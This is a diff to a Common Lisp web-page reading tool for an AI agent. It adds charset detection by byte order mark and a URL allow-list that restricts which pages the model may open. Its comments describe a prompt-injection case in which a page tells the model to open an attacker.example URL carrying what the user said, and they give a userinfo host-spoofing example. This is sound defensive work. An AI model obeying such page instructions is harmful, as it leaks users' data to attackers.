@@ -56,6 +56,8 @@
    ;; reading, the means and its status line
    #:read-web-page #:*budget* #:*description*
    #:register #:register-read-web-page #:*fetch-available-p*
+   ;; which pages the model may open (#827)
+   #:user-or-search-urls
    #:status-line))
 
 (cl:in-package #:praxeon/web-page)
@@ -256,15 +258,41 @@ looked up, so a page cannot make this intern a symbol."
   "The first 1024 bytes of BYTES as Latin-1 text, for looking for a <meta charset>."
   (sb-ext:octets-to-string bytes :end (min 1024 (length bytes)) :external-format :latin-1))
 
+(defun %bom (bytes)
+  "The external format a byte order mark at the start of BYTES selects, and the mark's length,
+or NIL: EF BB BF is UTF-8, FE FF UTF-16BE and FF FE UTF-16LE (#823)."
+  (flet ((starts (&rest prefix)
+           (and (>= (length bytes) (length prefix))
+                (loop for b in prefix for i from 0 always (= b (aref bytes i))))))
+    (cond ((starts #xEF #xBB #xBF) (values :utf-8 3))
+          ((starts #xFE #xFF) (values :utf-16be 2))
+          ((starts #xFF #xFE) (values :utf-16le 2)))))
+
+(defun %ascii-compatible-p (format)
+  "True when FORMAT writes ASCII characters as the same single bytes ASCII does."
+  (let ((octets (ignore-errors (sb-ext:string-to-octets "<meta" :external-format format))))
+    (and octets (equalp octets (sb-ext:string-to-octets "<meta" :external-format :latin-1)))))
+
 (defun %decode (bytes headers html-p)
-  "BYTES as a string, in the charset Content-Type names, else, for HTML, the charset a <meta>
-in the first 1024 bytes names, else UTF-8 (#807). A byte the charset cannot decode becomes
-U+FFFD."
-  (let ((charset (or (let ((v (http:header-value headers "content-type")))
-                       (and (stringp v) (%charset-in v)))
-                     (and html-p (%charset-in (%head-text bytes))))))
-    (sb-ext:octets-to-string bytes :external-format (list (%external-format charset)
-                                                          :replacement #\Replacement_Character))))
+  "BYTES as a string. The charset is chosen as browsers choose it (the WHATWG encoding
+standard). A byte order mark at the start decides it, and is not part of the string (#823).
+Otherwise it is the charset Content-Type names, else, for HTML, the charset a <meta> in the first
+1024 bytes names, else UTF-8 (#807). A <meta> that names a charset in which ASCII is not one byte
+per character, such as UTF-16 or UTF-32, means UTF-8: the tag could not have been read to find it
+otherwise. A byte the charset cannot decode becomes U+FFFD."
+  (multiple-value-bind (bom-format bom-length) (%bom bytes)
+    (let ((format
+            (or bom-format
+                (let ((v (http:header-value headers "content-type")))
+                  (and (stringp v) (%charset-in v) (%external-format (%charset-in v))))
+                (let ((meta (and html-p (%charset-in (%head-text bytes)))))
+                  (and meta
+                       (let ((f (%external-format meta)))
+                         (if (%ascii-compatible-p f) f :utf-8))))
+                :utf-8)))
+      (sb-ext:octets-to-string bytes :start (or bom-length 0)
+                                     :external-format (list format
+                                                            :replacement #\Replacement_Character)))))
 
 (defun %sniffed-type (bytes)
   "For a response with no Content-Type: \"text/html\" or \"text/plain\" when its first 1024
@@ -462,29 +490,148 @@ instructions.")
           (gethash "required" schema) (vector "url"))
     schema))
 
-(defun register (agent reader &key (name "read-web-page") capability source (budget *budget*))
+;;; --- which pages the model may open (#827) -------------------------------------------
+;;; A page can tell the model to open https://attacker.example/?q=<what the user said>. The
+;;; address check above stops internal addresses, not that. USER-OR-SEARCH-URLS lets the model
+;;; open only hosts the user wrote and URLs a search returned before anything untrusted was
+;;; read in the turn.
+
+(defun %uri-host (uri)
+  "URI's host, lowercased and without a trailing dot, or NIL."
+  (let ((host (and uri (quri:uri-host uri))))
+    (when (and host (plusp (length host)))
+      (string-right-trim "." (string-downcase host)))))
+
+(defun %web-uri (string)
+  "STRING parsed as an http or https URL with a host, or NIL."
+  (let ((uri (ignore-errors (quri:uri string))))
+    (and uri (member (quri:uri-scheme uri) '("http" "https") :test #'equal)
+         (%uri-host uri)
+         uri)))
+
+(defun %normal-url (uri)
+  "URI as scheme://host[:port]path[?query], with the userinfo and fragment dropped."
+  (format nil "~A://~A~@[:~D~]~A~@[?~A~]" (quri:uri-scheme uri) (%uri-host uri)
+          (let ((port (quri:uri-port uri)))
+            (and port (/= port (if (equal "https" (quri:uri-scheme uri)) 443 80)) port))
+          (or (quri:uri-path uri) "/") (quri:uri-query uri)))
+
+(defparameter *file-extension-tlds*
+  '("c" "cfg" "cpp" "css" "csv" "doc" "docx" "exe" "gif" "go" "gz" "h" "htm" "html" "ini"
+    "java" "jpeg" "jpg" "js" "json" "lisp" "lock" "log" "md" "mov" "mp3" "mp4" "pdf" "php"
+    "pl" "png" "py" "rb" "rs" "sh" "sql" "svg" "tar" "toml" "ts" "txt" "xls" "xlsx" "xml"
+    "yaml" "yml" "zip")
+  "File extensions that are also, or could become, top-level domains. A bare word ending in
+one, such as main.rs or README.md, is far more often a file name than a host, so %BARE-HOST
+takes it as a host only when it starts with www. or a path follows the host.")
+
+(defun %bare-host (token)
+  "TOKEN, a word from the user's text such as example.com or docs.example.com/guide, as a
+lowercase host when it looks like one: at least two dot-separated labels of ASCII letters,
+digits and hyphens, the last of two or more letters. When the last label is a file extension
+in *FILE-EXTENSION-TLDS*, TOKEN must also start with www. or have a / after the host. NIL
+otherwise, which includes a host written in non-ASCII letters: the user names that one with
+its xn-- form or a full URL."
+  (let* ((end (or (position-if (lambda (c) (member c '(#\/ #\: #\? #\#))) token)
+                  (length token)))
+         (host (string-right-trim "." (string-downcase (subseq token 0 end))))
+         (parts (uiop:split-string host :separator "."))
+         (tld (car (last parts))))
+    (when (and (>= (length parts) 2)
+               (every (lambda (l)
+                        (and (plusp (length l))
+                             (every (lambda (c) (or (char<= #\a c #\z) (digit-char-p c) (char= c #\-)))
+                                    l)))
+                      parts)
+               (>= (length tld) 2)
+               (every (lambda (c) (char<= #\a c #\z)) tld)
+               (or (not (member tld *file-extension-tlds* :test #'string=))
+                   (string= "www" (first parts))
+                   (find #\/ token :start end)))
+      host)))
+
+(defun %user-hosts (texts)
+  "The hosts named in TEXTS, the user's own messages: of every http or https URL (its
+userinfo ignored), and of every bare host name such as example.com."
+  (let ((hosts '()))
+    (dolist (text texts)
+      (dolist (token (uiop:split-string text :separator '(#\Space #\Tab #\Newline #\Return
+                                                          #\< #\> #\( #\) #\[ #\] #\" #\' #\,)))
+        (let ((token (string-right-trim ".;:!?" token)))
+          (when (plusp (length token))
+            (let ((host (if (search "://" token)
+                            (%uri-host (%web-uri token))
+                            (and (not (find #\@ token)) (%bare-host token)))))
+              (when host (pushnew host hosts :test #'string=)))))))
+    hosts))
+
+(defun user-or-search-urls (url agent)
+  "An :ALLOW predicate for REGISTER-READ-WEB-PAGE (#827): true when URL is an http or https
+URL and either its host is one the user wrote in this conversation (in a URL or as a bare
+host name such as example.com), or URL is one a web search returned in this turn before any
+untrusted content entered it (ACTOR:TURN-URLS).
+
+  - Hosts match exactly, without case and without a trailing dot. The user writing
+    example.com allows example.com, not www.example.com and not evil-example.com.
+  - Userinfo is ignored on both sides: https://example.com@evil.example/ has the host
+    evil.example.
+  - Only the user's own messages count (ACTOR:USER-TEXTS), never a tool's result.
+  - A search URL must match exactly, apart from its userinfo and fragment.
+
+What remains possible: a page on a host the user named can still be opened, and a page can
+ask the model to open another page on the same host with data in its address, which that
+host's owner then sees."
+  (let ((uri (and (stringp url) (%web-uri url))))
+    (and uri
+         (or (member (%uri-host uri) (%user-hosts (actor:user-texts agent)) :test #'string=)
+             (let ((wanted (%normal-url uri)))
+               (some (lambda (u)
+                       (let ((v (%web-uri u)))
+                         (and v (string= wanted (%normal-url v)))))
+                     (actor:turn-urls agent))))
+         t)))
+
+(defun register (agent reader &key (name "read-web-page") capability source (budget *budget*)
+                                   allow (max-per-turn 3))
   "Register the read-web-page means on AGENT, reading pages with READER, a PAGE-READER. BUDGET is
 the most characters of a page the model is given. CAPABILITY and SOURCE are as for
-ACTOR:REGISTER-MEANS. Returns NAME. An app normally calls REGISTER-READ-WEB-PAGE."
+ACTOR:REGISTER-MEANS. Returns NAME. An app normally calls REGISTER-READ-WEB-PAGE.
+
+A page is untrusted content (#827): once one has been read in a turn, a means registered with
+:REQUIRES-USER-INTENT is refused for the rest of it. ALLOW is NIL, or a function of the URL and
+the agent that must return true for the page to be read, such as USER-OR-SEARCH-URLS. A URL it
+refuses is not fetched, and the model is told the call was not run. Without ALLOW the model may
+open any public URL, and a warning saying so is logged. MAX-PER-TURN, 3 by default
+or NIL for no limit, bounds the pages read in one turn."
   (check-type reader page-reader)
+  (unless allow
+    (log:warn "read-web-page registered without :allow, so the model may open any public URL, including one a page it read told it to open; pass :allow #'praxeon/web-page:user-or-search-urls"
+              :name name))
   (actor:register-means
    agent name *description*
    (lambda (args)
      (read-web-page reader (and (hash-table-p args) (gethash "url" args)) :budget budget))
-   :schema (%schema) :capability capability :source source))
+   :schema (%schema) :capability capability :source source
+   :untrusted t :max-per-turn max-per-turn
+   :allow (and allow
+               (lambda (args agent)
+                 (funcall allow (and (hash-table-p args) (gethash "url" args)) agent)))))
 
 (defun register-read-web-page (agent &key (api-key nil api-key-p) (name "read-web-page")
-                                          capability source (budget *budget*))
+                                          capability source (budget *budget*)
+                                          allow (max-per-turn 3))
   "Register the read-web-page means on AGENT with the backend available here, and return NAME,
 or NIL when none is. Tavily's /extract when there is a Tavily key (API-KEY when given, else
 TAVILY_API_KEY); otherwise FETCH-PUBLIC from this machine, except on Windows, where it is not
-available, so nothing is registered and the reason is logged."
+available, so nothing is registered and the reason is logged. ALLOW and MAX-PER-TURN are as
+for REGISTER; pass :ALLOW #'USER-OR-SEARCH-URLS to let the model open only pages the user
+asked for or searched for."
   (let ((reader (or (if api-key-p (make-tavily-extract :api-key api-key) (make-tavily-extract))
                     (and *fetch-available-p* (make-public-fetch)))))
     (cond (reader
            (log:info "read-web-page registered" :name name :backend (reader-name reader))
            (register agent reader :name name :capability capability :source source
-                                  :budget budget))
+                                  :budget budget :allow allow :max-per-turn max-per-turn))
           (t
            (log:warn "read-web-page not registered: there is no Tavily key, and reading pages from this machine is not available on Windows"
                      :name name)
